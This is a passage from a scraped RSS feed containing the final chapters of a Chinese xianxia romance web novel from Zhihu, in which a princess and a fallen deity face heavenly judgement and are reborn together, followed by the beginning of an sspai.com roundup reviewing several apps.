眼前了。</p>\n<p>一天之后，一个面生的丫头进到我房间，朝我行了个礼。</p>\n<p>她说，疏桐在昨日晚上已经服药自尽了，她是来接替疏桐的丫鬟。</p>\n<p>她还说，疏桐给我留下了遗书，说对不起我，来世一定做牛做马。</p>\n<p>......有意思吗？</p>\n<p>没有。</p>\n<p>我朝着月亮，流下了一滴泪。</p>\n<p>桂花就要谢了。</p>\n<p>29.</p>\n<p>这场硬仗，前前后后，打了足足六个月。</p>\n<p>听门口的侍卫说，刍荆几次快要抵挡不住，却硬生生扛了下来。</p>\n<p>我在楼岚国，又变成了每天一个人的日子。</p>\n<p>再说得明白点，就是软禁。</p>\n<p>在楼岚国到两个月的时候，我突然吃不下饭。</p>\n<p>而且动不动就吐，行动也很僵硬，浑浑噩噩的，整个人状态非常不好。</p>\n<p>丫鬟们怕我是有什么心疾，连忙请了太医来看。</p>\n<p>那个时候我才知道，我居然怀孕了。</p>\n<p>我......怀孕了？</p>\n<p>是我和瀛玉的孩子。</p>\n<p>我本以为父皇会要我喝药，流掉这个孩子。</p>\n<p>毕竟是刍荆的种，在他眼里，大概会很厌恶吧。</p>\n<p>可出乎我意料的是，父皇他没有。</p>\n<p>他只是让我安心养胎。</p>\n<p>“朕的蓝儿，辛苦了。”</p>\n<p>那只拍在我肩膀上的手，出奇地沉重。</p>\n<p>第七个月刚开始的时候，侍卫同我说，这场战争马上就要结束了。</p>\n<p>我大概猜到了结局，因为那个侍卫同我说完这句话，第二天便上了战场。</p>\n<p>刍荆的士兵虽然人少，但以一当十，一个个身经百战，以命相搏。</p>\n<p>楼岚最后又被打退了。</p>\n<p>刍荆的军队逼到城门口时，我万万没想到，我的亲父皇，将我押了出来。</p>\n<p>我这才知道，他为什么不让我打掉这个跟瀛玉的孩子。</p>\n<p>原来，用场是在这里啊。</p>\n<p>父皇，您就是这样，对待自己的女儿的吗？</p>\n<p>他要让瀛玉看着，看着我，楼岚的九公主，他的太子妃，怀着他的孩子，站在城楼之上。</p>\n<p>我父皇，早在那么久以前就想好了，若是败仗，楼岚的退路该怎么找。</p>\n<p>原来是从我这个孩子身上找。</p>\n<p>好一个帝王之心，好一个亲父皇。</p>\n<p>真正站在这里的时候，我居然一点也不伤心，反而笑了起来。</p>\n<p>挺没意思的，真的。</p>\n<p>我的好父皇啊，您居然会以为瀛玉这样的人，会因为我而放弃攻城？</p>\n<p>瀛玉对我好是真的，但不至于分不清孰轻孰重啊。</p>\n<p>父皇，您真傻。</p>\n<p>瀛玉站在城楼下，与我遥遥相望，相顾无言。</p>\n<p>这么久没见，他瘦了，但还是很好看。</p>\n<p>这半年来，我对他日思夜想，现在终于见上了面，却是要离别。</p>\n<p>铠甲穿在他身上，英气逼人，飒爽得真是能去做个风流倜傥的江湖剑客。</p>\n<p>可是，刍荆国已经死了太多无辜的人。</p>\n<p>这场仗，必须打。</p>\n<p>楼岚，必须灭。</p>\n<p>我们......都要一起死。</p>\n<p>瀛玉搭起了箭，矛头对准我的喉咙，用力将弓拉满。</p>\n<p>他闭了一下眼睛，然后再度看向我。</p>\n<p>眼神是无尽的温柔，还有抱歉。</p>\n<p>不知怎么的，我竟还有心思去想，为什么这场景似曾相识，就像是我已经经历过一般？</p>\n<p>瀛玉看着我，张了张口，但最后什么都没说。</p>\n<p>然后，他的手毫不犹豫地松了开来。</p>\n<p>“嗖！”</p>\n<p>箭已离弦，冲我而来。</p>\n<p>30.</p>\n<p>天界。</p>\n<p>鸿钧本在入定，却突然睁开眼，大喊一声：</p>\n<p>“嫦娥！大事不好！”</p>\n<p>“此事已经被天帝发现了！”</p>\n<p>“什么？那怎么办？”</p>\n<p>鸿钧捋着胡子，满脸忧色：“迦蓝跟瀛玉这一遭，是很难顺利过去了......”</p>\n<p>嫦娥将手放在心口：“还是瞒不住吗......”</p>\n<p>“先看看他们怎么样了。”鸿钧匆匆一展袖袍，轮回白月盘上，白烟散去。</p>\n<p>嫦娥一看，便皱了眉：“还是跟上一世一模一样......”</p>\n<p>“这几乎是定居。毕竟二人在这一场轮回中，谁都没有上一世的记忆，性格没有变化，那最后的结局，本身就很难改变。”</p>\n<p>鸿钧叹了一口气：“天帝......就快来了，我们且去看看罢。”</p>\n<p>“天帝会怎么做？”嫦娥的睫毛上已满是泪花：“天帝是否会放过迦蓝？”</p>\n<p>“务必慎言，只是还好我们现在正在结界之中，不在天帝的可听范围之内。”</p>\n<p>鸿钧捋着胡须：“我与天帝相识已久，总的来说，他是心善之人。”</p>\n<p>“瀛玉为上神时，性情火爆，先前他之前那情劫我以为顶多算是半过不过，现在看来，他根本放不下。”</p>\n<p>“不管怎样，我们做了这一个局，总归还有一线希望。若是之前放瀛玉直接飞升上来抢人，那才是后果不堪设想。”</p>\n<p>31.</p>\n<p>人间。</p>\n<p>眼看着箭在我眼前，即将封喉的时候——</p>\n<p>我刚想闭上眼，突然，时间静止了。</p>\n<p>眼前的一切，都瞬间灰飞烟灭。</p>\n<p>战火，哭喊，鲜血，厮杀，均化为齑粉般的幻影。</p>\n<p>那一瞬间，我的身体里突然出现了一些......本不属于我的记忆。</p>\n<p>我终于知道，为什么我总会做那样的梦。</p>\n<p>为什么眼前的事情，我经常觉得似曾相识。</p>\n<p>因为，这本就是已经发生过的事情。</p>\n<p>我和瀛玉，不过是重来了一回。</p>\n<p>这，是鸿钧仙官给我们制造的机会。</p>\n<p>那一刻，我的记忆全部回来了。</p>\n<p>我本是迦蓝仙灵，最好的朋友，便是广寒宫的嫦娥上仙。</p>\n<p>瀛玉也曾是上神，同我一道下凡历情劫。</p>\n<p>本身我们并不认识，因为我住在九重天，而他住在三十三重天，道行完全不一样。</p>\n<p>可我们都双双折损在了这一关。</p>\n<p>我之前在第一次历劫的时候，以为情况是这样的：</p>\n<p>我们两个都历劫失败，瀛玉被夺神识，而我该受天谴。</p>\n<p>情急之下我的魂灵钻进了一只雪兔的身体，被旧时的好友嫦娥带回宫中，藏了起来，从而逃过了天劫。</p>\n<p>到了广寒宫，嫦娥帮我抹去了记忆，真真正正将我变成了她的玉兔。</p>\n<p>可......事实的真相，我现在才看见。</p>\n<p>其实当年，我若是能为了楼岚国，舍弃瀛玉，那便是情劫过了。</p>\n<p>瀛玉若是能为了刍荆国杀了我，那他的情劫，便也能过了。</p>\n<p>当年，是我没有过那道坎。</p>\n<p>可瀛玉明明过了！</p>\n<p>他为了刍荆的千千万万无辜子民，历年的春秋大业，毅然决然地杀死了我！</p>\n<p>而后城破，刍荆灭了楼岚，一切都结束了。</p>\n<p>他明明就是过了情劫的！</p>\n<p>他可以继续做他的上神！</p>\n<p>却在恢复神识和记忆后，自甘为我顶下天雷！</p>\n<p>我根本没有躲过天雷，天雷当时是落下了的！</p>\n<p>可我不知道，九九八十一道天雷啊，这天谴若是在我身上，受到一半估计就得要了命！</p>\n<p>瀛玉的神识，是直接被那九九八十一道天雷，一点一点打出身体的！</p>\n<p>他的做法触怒了天帝，被天帝剥去最后一分仅存的神格，但又无法死去，只能留在人间修炼！</p>\n<p>他修炼了多少年？我不知道。</p>\n<p>天上一天，地下一年。</p>\n<p>可我记得，我在天上的日子，都已经过了好几百年了。</p>\n<p>天上的几百年......人间的几十万年。</p>\n<p>怪不得，我时常觉得这广寒宫好冷。</p>\n<p>那似乎，并不是我应该常在的地方。</p>\n<p>怪不得，我喜欢去疏月园扑仙蝶。</p>\n<p>因为那里的温度最温暖，像极了刍荆的春暖夏凉。</p>\n<hr>\n<p><b>【应知乎读者要求，弄了个按更新顺序的目录~】</b></p>\n<p><b>【有赞真的会更有动力猛写！真的！求赞～阿郁努力日更！日更！会努力当领头驴！】</b></p>\n<h3>32.</h3>\n<p>我的回忆还未结束，忽然之间，周遭树静风止，广袤的天地之下，只有我和瀛玉二人。</p>\n<p>他与我对视一眼，我们飞快地跑到对方身边，紧紧相拥。</p>\n<p>瀛玉托着我的脸颊，对我说：“对不起。”</p>\n<p>我摇摇头：“我们没得选。”</p>\n<p>这时，天空中劈开一道金光！</p>\n<p>久违了，我们终于见到了天帝。</p>\n<p>万万没想到，天帝亲自来了。</p>\n<p>我上一次见到天帝，也就是第一次飞升，隔着很远望了一眼。</p>\n<p>没想到，第二次见面，就这么近距离。</p>\n<p>只见天帝缓缓开口，他的声音自四面八方传来，刚刚入耳时，我的身体不受控制地抖了一下。</p>\n<p>“上神瀛玉，仙灵迦蓝。”</p>\n<p>听到这话，我和瀛玉不约而同地跪了下来。</p>\n<p>“你们身为天界重要使者，擅自扰乱渡劫规律，一个逃脱惩罚，一个自甘堕落。你们二人，现在可知罪？”</p>\n<p>我和瀛玉同时开口：</p>\n<p>“迦蓝知罪。”</p>\n<p>“瀛玉知罪。”</p>\n<p>“请天帝责罚。”</p>\n<p>话说是这么说，但也就是客套一下，希望天帝能网开一面，求求。</p>\n<p>天帝叹了一口气：“看你们实在感情深重，两次轮回却都难以完满，也属实可惜。”</p>\n<p>“所以，瀛玉，迦蓝。”</p>\n<p>“现在你们有两个选择，一为大隐，二为小隐。”</p>\n<p>我抬起头，向天帝拜了一拜：</p>\n<p>“迦蓝敢问，何为大隐，又何为小隐呢？”</p>\n<p>“你们二人在民间待得久了，应该听闻过野坊有云，大隐隐于世，小隐隐于山林。”</p>\n<p>天帝的声音高高在上，从远方传来，却似乎又近在咫尺：</p>\n<p>“你们二人，本一个为法力高强的三十三重天上神，一个为九重天觉悟最高的仙灵，都是可以长生不死的。”</p>\n<p>“若要选择大隐，那便是入了凡间轮回，再无一丝法力，生生世世都无法再有重回天界的机会。你们会同凡人一样，有生老病死，七情六欲，艰辛坎坷，短暂地过完这一生。”</p>\n<p>“若是选择小隐，则需要主动抹去情劫的记忆，届时会有各自的司命官带你们修行，等到你们再到足以飞升的时机，便可再次重回天界。”</p>\n<p>“到时候，瀛玉，你便可做回你三十三重天最至高荣耀的上神，迦蓝你也可在九重天，与你的旧友为伴，再不分离。”</p>\n<p>“你们选吧。”</p>\n<p>33.</p>\n<p>我与瀛玉对视一眼，各自都读懂了对方的眼神。</p>\n<p>瀛玉朝我点点头，我会意，抬头直视天帝：</p>\n<p>“谢天帝垂怜，迦蓝和瀛玉感激不尽。”</p>\n<p>“我们......我们选择大隐！”</p>\n<p>天帝眉心一蹙，身后发出通天惊雷的巨响。</p>\n<p>——这是天帝震怒了！</p>\n<p>我一惊，想去拉瀛玉的手，后者却周身被镀上一层金箔，我一触碰，便被那层光圈直直地弹了回去！</p>\n<p>这道金箔不会伤害我，却不让我碰到瀛玉，也不让瀛玉得以动弹！</p>\n<p>天帝已经不知去了哪里，而雷声渐渐向我们袭来。</p>\n<p>瀛玉被金箔锁住动弹不得，他的口型，是让我快跑。</p>\n<p>原来如此，若是我们选了大隐，天帝便不会放过我们。</p>\n<p>罢了，罢了。</p>\n<p>死在一起，也是好事。</p>\n<p>无论是阴阳两隔，还是双生却不能相见，都是最痛苦的。</p>\n<p>死在一起，反而无憾。</p>\n<p>这天劫之雷，是数年前曾该落在我身上的劫。</p>\n<p>那时，瀛玉替我受下了。</p>\n<p>那么这一次，这道雷再劈下来，说什么我也要给他扛着。</p>\n<p>只要我还有一口气，这雷，就别想伤害我的瀛玉一寸一毫！</p>\n<p>天劫来得比我想象的，要快一万倍。</p>\n<p>电光火石之间，一道雷从高空处直直地劈下，直接对准了被禁锢住行动的瀛玉！</p>\n<p>这是第一道雷。</p>\n<p>34.</p>\n<p>我毫不犹豫地冲了上去，挡在瀛玉身前。</p>\n<p>雷打在我身上，只一秒便皮开肉绽。</p>\n<p>我之前做足了准备，以为自己会疼得尖叫。</p>\n<p>可真正体会到之后，原来，根本喊不出来。</p>\n<p>只是一下，便已疼得要昏过去。</p>\n<p>周遭是浓厚的血腥味，那一记天雷劈在我的腰部，钻心的疼。</p>\n<p>我站不起来了。</p>\n<p>可第二道雷紧跟着劈下。</p>\n<p>我退无可退，只能强行扭着身体，往瀛玉前面靠。、</p>\n<p>第二道雷落下，我终于疼得喊了出来。</p>\n<p>“啊啊啊啊啊啊啊啊啊啊啊啊啊！”</p>\n<p>第三道，第四道，第五道，第六道......</p>\n<p>肩膀，胯部，小腿，手臂......</p>\n<p>一道一道，速度越来越快。</p>\n<p>我咳出来的血，将瀛玉身下的金箔都染成了红色。</p>\n<p>我不敢去看自己的身体，此刻大抵已经是体无完肤。</p>\n<p>瀛玉......原来它这么疼。</p>\n<p>最后站不得，哭不得，晕过去，再被打醒。</p>\n<p>死去活来，求死不得，求生不能。</p>\n<p>哭都没有力气了，不知道这是第几道。</p>\n<p>我当然也不敢抬头去看瀛玉的脸。</p>\n<p>不然，我的心一定会痛得要裂开。</p>\n<p>35.</p>\n<p>最后一道雷来时，我拖着沉重的身躯，一点一点地爬到瀛玉的面前。</p>\n<p>他的身体不能动，眼睛却已经是血红色。</p>\n<p>求你......不要。</p>\n<p>谁？</p>\n<p>是瀛玉在说话吗？</p>\n<p>我......是不是已经幻听了？</p>\n<p>抬起头，只看见瀛玉眼角滚下一滴泪来。</p>\n<p>在这种情况下，我竟然笑了出来。</p>\n<p>最后一点神识，用来跟我说了这么一句话。</p>\n<p>“瀛玉。”我笑着，口中喷出一股鲜血。</p>\n<p>那血真红，真多啊，呛的我满口都是，鼻腔里也溢满了粘稠的液体。</p>\n<p>真抱歉，死的时候给你留下的印象，是这么丑的。</p>\n<p>“我......我爱你。”</p>\n<p>说完这句话，我用最后的气力，再次挡在瀛玉身前。</p>\n<p>我只是一个小仙灵，按我的资历和魂魄，本不该受得了这八十一道天雷，早应魂飞魄散了。</p>\n<p>或许是执念所致，我竟撑到了现在。</p>\n<p>这样的爱，无所不能。</p>\n<p>我亦感谢这样的奇迹，让我的瀛玉，至少能活在这世间，哪怕是只有一世也好。</p>\n<p>嫦娥跟我关系那么好，一定会帮忙消除他所有的记忆的，毕竟他之后只是个凡人。</p>\n<p>天界太冷了，咱们就想来人间看看，这里多好啊......</p>\n<p>你看啊瀛玉，桂花，又要开了......</p>\n<p>36.</p>\n<p>“砰！”</p>\n<p>天雷将地面砸出一个巨大的坑洞。</p>\n<p>过了许久，我才睁开眼。</p>\n<p>这道天雷......没劈到我身上？</p>\n<p>我......没死？</p>\n<p>不过......</p>\n<p>大概也快了吧。</p>\n<p>下一秒，瀛玉周身的金箔瞬间碎裂，他几乎是立刻就扑到了我的身上。</p>\n<p>瀛玉的眼尾红得比血色还要浓烈，他颤抖地托着我残破不堪的身体，手都不知道往哪儿放。</p>\n<p>他的声音颤抖着：</p>\n<p>“迦蓝，迦蓝，你看看我，你不要睡。”</p>\n<p>“迦蓝！迦蓝你不要闹！别吓我！”</p>\n<p>“听着，阿蓝，别害怕，不要怕，信我，能治好，咱们能治好的......”</p>\n<p>“楼迦蓝，你看看我......你傻不傻......”</p>\n<p>我试着想抬起手，抚去他眼角边快要掉下的一滴泪。</p>\n<p>可是，我的手怎么也使不上力气。</p>\n<p>瀛玉的怀抱，好温暖啊。</p>\n<p>他是炽热的，鲜活的。</p>\n<p>这么多年在天上，真的太冷了。</p>\n<p>有这么一刻，留在他怀里......</p>\n<p>也值了。</p>\n<p>37.</p>\n<p>不知是什么时候，天帝又出现在我们眼前。</p>\n<p>这一次，他的眼神，似乎有些与刚才不同的意味。</p>\n<p>突然间他大手一挥，天降甘霖，落在我和瀛玉的身上。</p>\n<p>不知不觉间，我的身上似乎，没那么疼了。</p>\n<p>从瀛玉的表情来看，我似乎正在恢复。</p>\n<p>没过多久，我发现自己渐渐有了力气。</p>\n<p>“瀛......瀛玉......”</p>\n<p>瀛玉的头发被雨水打湿，贴在脸颊上，有一种破碎的美感。</p>\n<p>“嗯，阿蓝，我在。”瀛玉抱紧了我：“阿蓝，你......你还好吗？”</p>\n<p>我点点头，发现自己浑身竟已经完好无损。</p>\n<p>瀛玉与我，一同看向上空的天帝。</p>\n<p>天帝摇摇头：“罢了。这一次......就放你们走吧。”</p>\n<p>“方才，嫦娥跟老鸿钧来找我了，还跟我打了一个赌。”</p>\n<p>“他们跟我打赌说，若是迦蓝愿意如千年以前，瀛玉保护她那般，以命挡住天雷，那我便网开一面，放你们大隐。”</p>\n<p>“我答应了，而你们做到了......我也该履行承诺。”</p>\n<p>“迦蓝，你该庆幸，你有如此替你着想的两位至交好友。”</p>\n<p>“你们若是选择大隐，之前的记忆会全部消失，再也没有入天界的可能性了。”</p>\n<p>我朝天帝磕了一个头：“迦蓝此生无以为报鸿钧仙官与嫦娥上仙了，还烦请天帝替我跟瀛玉，向他们二人道一声谢。”</p>\n<p>天帝看了我们一眼，转身离去了。</p>\n<p>而我跟瀛玉的手上，不知道什么时候，居然多了一根红绳。</p>\n<p>我的耳边，居然传来了嫦娥的声音。</p>\n<p>听到她声音的那一刻，我便忍不住地掉了眼泪。</p>\n<p>“迦蓝，这是我去问月老要的红线，一定要带着啊，这样你们生生世世，就都能在一起啦。”</p>\n<p>“来不及跟你当面告别了，再见啦，我会想你的。”</p>\n<p>刹那间，新芽抽绿，万物生长，天色分明，溪流淙淙。</p>\n<p>我们的眼前，瞬时出现一个巨大的光圈。</p>\n<p>瀛玉不由分说，偏头吻住我的唇。</p>\n<p>我闭上眼睛，享受这一刻的温存。</p>\n<p>眼前的光斑，在一帧一帧地闪烁。</p>\n<p>我知道，这是在催促我们了。</p>\n<p>瀛玉牵起我的手，一同走到光圈跟前。</p>\n<p>我看向他，他也看向我。</p>\n<p>“那就......待会儿见？”</p>\n<p>瀛玉笑了。</p>\n<p>“嗯，一会见，阿蓝。”</p>\n<p>然后，我们义无反顾地，一同跨了进去。</p>\n<h3><b>【尾声】</b></h3>\n<p>很多很多年以后。</p>\n<p>“呜哇！”</p>\n<p>婴孩的啼哭声，代替了今早的公鸡打鸣，将整个仙月国唤醒。</p>\n<p>仙月国的太子，和丞相府大夫人的女儿，在同一天出生了。</p>\n<p>那天晚霞成彩云追月之势，仙月国的国师说，此乃福相双至。</p>\n<p>当然不仅是国师这么说，民间的街坊邻居，大街小巷的百姓，也都看见了这一奇观，皆连赞叹仙月国定是有大喜之事。</p>\n<p>皇帝闻之大喜，大手一挥，大赦天下。</p>\n<p>并且将这丞相府的女儿钦定为未来的太子妃，并赐上好的白玉红绳一对。</p>\n<p>一根，即刻绕在太子手上。</p>\n<p>一根，则系在这丞相府大小姐的手腕。</p>\n<p>小太子跟大小姐，从牙牙学语到总角之年，一路这么对打对骂过来，谁也看不上谁。</p>\n<p>但真说要退婚吧......二人倒是一块儿脸红了，说那倒也不必。</p>\n<p>真倒是当局者迷，旁观者清。</p>\n<p>你们二人有没有那劳什子情爱，咱们作为明眼人，可看得那叫一个再清楚不过了！</p>\n<p>再后来，仙月国的太子成了皇帝，太子妃成了皇后。</p>\n<p>民间的说书人，也都爱说他们这对少年夫妻的故事。</p>\n<p>你如果要问，说书人是怎么说的呢？</p>\n<p>那就得从很多年前说起了。</p>\n<p>告诉您，这皇上跟皇后啊，那可是天赐的姻缘呢！</p>\n<p>就像是......就像是从一开始就注定好的！</p>\n<p>不信？</p>\n<p>这可是真的！我可知道许多内情！</p>\n<p>想听？</p>\n<p>那您就搬个板凳，只要两个铜钱，便能听一出真正的好戏！</p>\n<p>客官快过来，瓜子茶水已经备好。</p>\n<p>听我在这里给您呀，慢慢儿说......</p>\n<p><b>【END】</b></p>\n<p><b>【呼~又一篇阿郁的古言完结啦，还是照旧日更~更了六天，终于结束啦！】</b></p>\n<p><b>【感谢大家的支持，走过路过点个赞和关注呀！谢谢！鞠躬。jpg】</b></p>\n<p><b>【我们下一篇写橙子和梁主席的故事！】</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xu-nian-nian-angla?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">庄停郁</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484001869/answer/2098143630?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">194 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/360227471?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">嫦娥和玉兔会有什么日常呢？</a><br><a href=\"http://www.zhihu.com/question/35974811?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">后羿能射下9个太阳，为什么老婆背叛他跑到月亮上了，嫦娥不怕被射下来么？后羿为什么不射呢？</a><br>\n","link":"http://www.zhihu.com/question/484001869/answer/2098143630?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派评 | 近期值得关注的 App","date":"2021-09-13 09:33:30","description":"\n<p>本期《派评》的主要内容有：</p>\n<ul>\n<li>🎵 帮你收集喜欢的音乐：Chart Your Music。</li>\n<li>🏊 Android 健身计时工具：Wit。</li>\n<li>⌚️ Android 白噪音组合器：Noice。</li>\n<li>📒 集合 Markdown、看板、标签于一身，《大师笔记》限时特惠中。</li>\n<li>📖 老牌白板工具 Milanote 大版本更新。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>Chart Your Music：将喜欢的音乐用图表呈现</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：音乐</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：虽说现在我们往往都习惯于通过流媒体服务像「吃快餐」一样地欣赏音乐，但有时候我们希望可以将喜欢的音乐进行细致的分类和整理，甚至排列出属于自己的「TOP 10」——虽说这倒是有点儿强迫症的意味，但这又远比所谓播放列表的功能更自由，要知道播放列表中的音乐可没有公告牌那样的每周排名。</p>\n<p>有创建一个属于自己的「音乐公告牌」榜单的想法的可能并不是少数人， Chart Your Music 开发者的想法和我差不多，他早期用的是通过 macOS 上的 iChart 来编写，现在是属于移动互联网的时候，有时候我们希望榜单可以与时俱进，比如将其流媒体音乐结合，可以导入流媒体上的音乐等等——所以 Chart Your Music 就此诞生。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhhtdb34tdhopdm1hg.png\"></figure><p>相比那些成熟大厂制作的 App，Chart Your Music 有着浓郁的极客 DIY 的味道，对于那些习惯使用账户授权同步的朋友而言，Chart Your Music 这种几乎完全「不智能」的榜单创建方式繁琐又复杂，但对于真正喜欢音乐的朋友而言又十分亲切——手动创建榜单，然后将相关的单曲条目手动录制进去，唯一可以省点事儿可能就是可以从 iTunes、Apple Music 或者 Spotify 中搜索音乐或者导入你创建的播放列表了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhhttb34tdhopdm1i0.png\"></figure><p>实际上当你手动创建好一个属于你自己的「公告牌」时还是颇有成就的，结合 iTunes 或者 Apple Music 你还可以在 Chart Your Music 直接播放榜单中的音乐，你可以随时调整你榜单中歌曲的排序，并且可以查看你录入的歌曲作品的详细信息，随着时间的推移你可以通过图表看到音乐在不同榜单中的升降排名以及位置变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/13/0c5ebd2e8dd7a07e6a556d6f0e934188.png\"></figure><p>最后你也可以将榜单通过小部件的形式放置到屏幕上，除了 iPhone 之外你还可以通过 iPad 来管理，Chart Your Music 支持通过 iCloud 来同步榜单，应用本身提供免费下载，内购主要是解锁榜单中条目限制。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/chart-your-music/id1555882478\" target=\"_blank\">App Store</a> 下载 Chart Your Music。</p>\n<span class=\"ss-application\" app-id=\"16164\"> </span><h3>Wit：健身计划的配套计时器</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：健身、计时器</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：生命在于运动，像我这种健身小白，一般都会跟着 App 里现成的训练计划执行，上面有比较详细的动作指导和时间安排。很多有经验有基础的朋友，他们了解自己的身体，也更倾向于根据实际需求安排健身计划，包括训练项目、训练时间、计划安排等。Wit 这款 App 就面向此类健身人群，它不会直接提供训练指导，而是将用户的自定义内容数字化，以帮助用户更高效率执行健身计划。</p>\n<p>在使用内建计划的健身 App 时我们可以发现，它们通常以「体能」「爆发力」等训练目的或者「上肢」「腰部」等训练部位为一个计划，其中又分为各种训练动作。Wit 也是这种使用逻辑，它会引导用户将不同动作组成一套训练项目，非常符合我们实际锻炼的需求。Wit 已经内置了一些训练动作，它们被统称为「动作词典」，用户可以自行删减和修改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhhutb34tdhn8pbj00.png\"></figure><p>添加计划时，我们按照训练项目的前后顺序依次添加单个动作的词条，之后切换到「Workout」页面，在这里设置重复次数、持续时间还有热身和休息时长等计划信息，页面最下方还有预览和统计，用户可以快速预览训练计划和各类型训练的占比。保存后就生成了一个独立的训练计划。</p>\n<p>使用时，用户直接点击开始按钮，Wit 首先会倒数 10 秒，之后按照计划依次计时。动作切换时还会给出倒计时提示音、震动提示以及语音朗读，这样用户就不需要每一次都低头查看下一个训练项目了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhhvdb34tdhtodsoog.png\"></figure><p>不过需要注意的是，动作词典中的词条仅仅是提示所用，其中并不能详细编辑动作要领、动作规范等内容，所以 Wit 也仅仅适合有一定经验的健身用户使用。如果你也需要一个健身计时器，可以在 <a href=\"https://play.google.com/store/apps/details?id=com.workout.intervaltimer\" target=\"_blank\">Google Play</a> 免费下载 Wit。</p>\n<span class=\"ss-application\" app-id=\"16165\"> </span><h3>Noice：白噪音组合器</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：白噪音</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：如果你平时留意身边的声音，就不难发现蝉鸣也好，咖啡馆的熙熙攘攘也好，这些我们习以为常的声音往往有着莫名的魔力，会给我们带来一种安心感，并能够增强我们的专注力。</p>\n<p>早先少数派介绍过的白噪音组合器 Noice 经过一年的更新现如今功能更加丰富，界面也愈加美观。现在打开 Noice，除了声音的名称外，Noice 还会将声音来源以背景图案的形式展现出来，对于用户而言这种图案要比单纯的文字描述更加直观。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhhvtb34tdhopdm1ig.jpeg\"></figure><p>而在功能更新上，Noice 在维持了允许用户自由组合各类声音的主要功能外，还进一步支持通过 Chromecast 将声音投射至音箱，对于想要追求更好声音效果的用户而言无疑是一大利好。此外，Noice 还根据使用场景增加了许多实用的小功能，如允许用户设置是否忽略其他应用的声音，设置声音淡入时长等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi05b34tdhopdm1j0.jpeg\"></figure><p>如果你正在寻找一款实用且免费的白噪音应用，Noice 会是一个不错的选择。你可以通过 <a href=\"https://play.google.com/store/apps/details?id=com.github.ashutoshgngwr.noice\" target=\"_blank\">Play Store</a> 下载使用 Noice。</p>\n<span class=\"ss-application\" app-id=\"15644\"> </span><h3>Wakeout!：端起 Mac 来运动</h3>\n<ul>\n<li>平台：macOS / iOS / iPadOS</li>\n<li>关键词：运动、健身</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：虽然全球疫情形势依旧严峻，但大家基本都恢复了工作状态。之前那套纯宅家的运动模式或许已不太适用当下情景，<a href=\"https://sspai.com/post/63876\" target=\"_blank\">2020 App Store 年度 App</a>、运动应用 <a href=\"https://sspai.com/app/Wakeout\" target=\"_blank\">Wakeout!</a> 新增了数十种全新的锻炼项目，并在上周上架了 macOS 平台，让你可以带着自己的 MacBook 一边工作\\一边锻炼。</p>\n<p>和去年我们评测 Wakeout! 时，总与床、沙发「发生关系」不同，今年以来 Wakeout! 首屏推荐的项目几乎都与办公室有关，有端着笔记本电脑的负重训练，有靠在办公椅上的拉伸练习，也有坐在工位上的简易健身操。相比 iOS 端需要找个支架支起屏幕才能跟上进度，笔记本竖立的大屏无疑更为便捷，和全新的锻炼项目匹配度也更高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi0db34tdhn8pbj0g.jpeg\"></figure><p>macOS 版同样内置了「计时器」和「锻炼计划」功能，你可以根据工作安排，适时在计划一栏种，配置自己一天的体育锻炼。不过由于 Wakeout 的计划仅能区分工作日和周末，自由度不够高，计时器功能显得尤为贴心。开启 Wakeout! 后，计时器会常驻菜单栏，无论是你坐久了觉得腰酸想轻松一下，还是刚好有时间可以活动活动，都可以从菜单栏中快速启动一分钟放松训练，或者使用固定时长的活动计时，跟着教程甩甩腿、扭扭腰，告别久坐带来的不良影响。</p>\n<p>Wakeout! 采取订阅模式，你可以按每月 35 元、或每年 253 元付费订阅。这价格相比于健身房的价格自然不值一提，但我一直将 Wakeout! 